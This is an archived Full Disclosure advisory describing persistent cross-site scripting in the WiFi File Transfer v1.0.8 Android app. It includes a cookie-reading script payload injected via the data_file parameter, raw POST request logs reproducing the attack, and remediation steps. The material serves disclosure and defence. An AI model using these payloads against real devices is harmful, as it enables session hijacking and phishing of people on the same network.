---
title: WiFi File Transfer v1.0.8 - Cross Site Scripting	Vulnerabilities
url: https://seclists.org/fulldisclosure/2022/Oct/18
source: Full Disclosure
date: 2022-10-22
fetch_date: 2025-10-03T20:39:47.142446
---

# WiFi File Transfer v1.0.8 - Cross Site Scripting	Vulnerabilities

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# WiFi File Transfer v1.0.8 - Cross Site Scripting Vulnerabilities

---

*From*: "info () vulnerability-lab com" <info () vulnerability-lab com>
*Date*: Mon, 17 Oct 2022 09:58:24 +0200

---

```
Document Title:
===============
WiFi File Transfer v1.0.8 - Cross Site Scripting Vulnerabilities

References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2322

Release Date:
=============
2022-10-17

Vulnerability Laboratory ID (VL-ID):
====================================
2322

Common Vulnerability Scoring System:
====================================
5.6

Vulnerability Class:
====================
Cross Site Scripting - Persistent

Current Estimated Price:
========================
500€ - 1.000€

Product & Service Introduction:
===============================
WiFi File Transfer lets you transfer files to/from your phone or tablet via WiFi. Easy to use web interface, no USB
cable required.

(Copy of the Homepage:https://play.google.com/store/apps/details?id=com.smarterdroid.wififiletransfer&hl=de&gl=US  )

Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a multiple persistent cross site vulnerabilities in the WiFi
File Transfer v1.0.8 mobile android web-application.

Affected Product(s):
====================
smarterDroid
Product: WiFi File Transfer v1.0.8 - Android (Wifi) (Web-Application)

Vulnerability Disclosure Timeline:
==================================
2022-10-17: Public Disclosure (Vulnerability Laboratory)

Discovery Status:
=================
Published

Exploitation Technique:
=======================
Remote

Severity Level:
===============
Medium

Authentication Type:
====================
Open Authentication (Anonymous Privileges)

User Interaction:
=================
Low User Interaction

Disclosure Type:
================
Independent Security Research

Technical Details & Description:
================================
A persistent input validation web vulnerability has been discovered in the WiFi File Transfer v1.0.8 mobile
web-application for android.
The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector to
compromise browser to web-application
requests from the application-side.

The vulnerabilities are located in the data_file parameter of the add a file or folder and create a zip file function.
Attackers with wifi access are able to anonymous use the webui and can inject own malicious script code with persistent
attack vector via post method request.

Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent
external
redirects to malicious source and persistent manipulation of affected application modules.

Proof of Concept (PoC):
=======================
The persistent post inject web vulnerabilities can be exploited by remote attackers in the same wifi network with
anonymous privileges and low user interaction.
For security demonstration or to reproduce the web security vulnerability in the application follow the provided
information and steps below to continue.

Manual reproduce of the vulnerability ...
1. Install the mobile android application and start it
2. Start the wifi web-server
3. Login as attacker by the browser over the network
4. Inject payload as folder name, file name or zip file and save via post method request
5. The payload executes in the web ui when previewing the paths

Exploitation: Payload
<a onmouseover=alert(document.cookie)>picture1337.jpg</a>

--- PoC Session Logs #1 (POST) [Add] [Create] [Folder] [data_file] ---
http://localhost:1234/storage/emulated/0/DCIM/
Host: localhost:1234
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------321836412920954805143620932676
Content-Length: 613
Origin:http://localhost:1234
Connection: keep-alive
Referer:http://localhost:1234/storage/emulated/0/DCIM/
action=mkdir&data_file=New"><a
onmouseover=alert(document.cookie)>picture1337.jpg</a>&data_currentParams=?&data_filepath=/storage/emulated/0/DCIM/
-
POST: HTTP/1.1 302 OK
Connection: Close
Content-Type: text/html
Location:http://localhost:1234/storage/emulated/0/DCIM/
Content-Length: 143
-
http://localhost:1234/storage/emulated/0/DCIM/
Host: localhost:1234
Accept-Encoding: gzip, deflate
Referer:http://localhost:1234/storage/emulated/0/DCIM/
Connection: keep-alive
-
POST: HTTP/1.1 200 OK
Connection: Close
Content-Type: text/html

--- PoC Session Logs #2 (POST) [Add] [Create] [Zip] [data_file] ---
http://localhost:1234/storage/emulated/0/Pictures/?
Host: localhost:1234
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------289297208414223233314228108045
Content-Length: 882
Origin:http://localhost:1234
Connection: keep-alive
Referer:http://localhost:1234/storage/emulated/0/Pictures/?
Upgrade-Insecure-Requests: 1
action=multizip&data_file=.<a
onmouseover=alert(document.cookie)>File.Zip</a>.Zip&data_currentParams=?&data_filepath=/storage/emulated/0/Pictures/&1.jpg=file&2.jpg=file
-
POST: HTTP/1.1 200 OK
Connection: Close
Content-Type: text/html
Location:http://localhost:1234/storage/emulated/0/Pictures/
Content-Length: 151
-
http://localhost:1234/storage/emulated/0/Pictures/
Host: localhost:1234
Accept-Encoding: gzip, deflate
Referer:http://localhost:1234/storage/emulated/0/Pictures/?
Connection: keep-alive
Upgrade-Insecure-Requests: 1
-
POST: HTTP/1.1 200 OK
Connection: Close
Content-Type: text/html

Reference(s):
http://localhost:1234/
http://localhost:1234/storage/
http://localhost:1234/storage/emulated/
http://localhost:1234/storage/emulated/0/
http://localhost:1234/storage/emulated/0/DCIM/
http://localhost:1234/storage/emulated/0/Pictures/

Solution - Fix & Patch:
=======================
The persistent web vulnerabilities can be resolved by the following steps ...
1. Restrict the input of the folder, filename and zip files to disallow special chars for add or create process
2. Encode and escape the content of the data_file parameter to sanitize the content
3. Sanitize and filter the output locations of the explorer path listings to prevent further attacks

Security Risk:
==============
The security risk of the persistent web vulnerabilities in the mobile android wifi web-application are estimated as
medium.

Credits & Authors:
==================
Vulnerability-Lab [Research Team] -https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab

Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all
warranties,
either expressed or implied, including the warranties of merchantability and capability for a particular purpose.
Vulnerability-Lab
or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of
business profits
or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages.
Some states do
not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation
may not apply.
We do not approve or encoura...